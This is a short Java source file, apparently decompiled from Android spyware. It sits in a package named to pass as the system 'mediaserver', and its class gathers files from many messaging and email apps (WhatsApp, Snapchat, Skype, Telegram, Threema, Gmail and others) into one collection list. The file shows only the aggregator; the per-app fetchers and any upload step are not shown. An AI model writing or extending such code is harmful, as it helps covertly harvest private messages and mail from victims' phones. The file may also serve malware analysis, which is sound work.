package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.util.ArrayList;
import java.util.List;

public class ApplicationsFetcher {
  private List<FileFetcher> mApplications = new ArrayList();

  public ApplicationsFetcher() {
    this.mApplications.add(new WhatsappFetcher());
    this.mApplications.add(new SnapchatFetcher());
    this.mApplications.add(new SkypeFetcher());
    this.mApplications.add(new ViberFetcher());
    this.mApplications.add(new MessengerFetcher());
    this.mApplications.add(new HangoutsFetcher());
    this.mApplications.add(new TelegramFetcher());
    this.mApplications.add(new KakaoTalkFetcher());
    this.mApplications.add(new ThreemaFetcher());
    this.mApplications.add(new GmailFetcher());
    this.mApplications.add(new StockEmailFetcher());
  }

  public List<FetchedFile> fetch() {
    List<FetchedFile> filesToFetch = new ArrayList();
    for (FileFetcher appFetcher : this.mApplications) {
      filesToFetch.addAll(appFetcher.fetch());
    }
    return filesToFetch;
  }
}
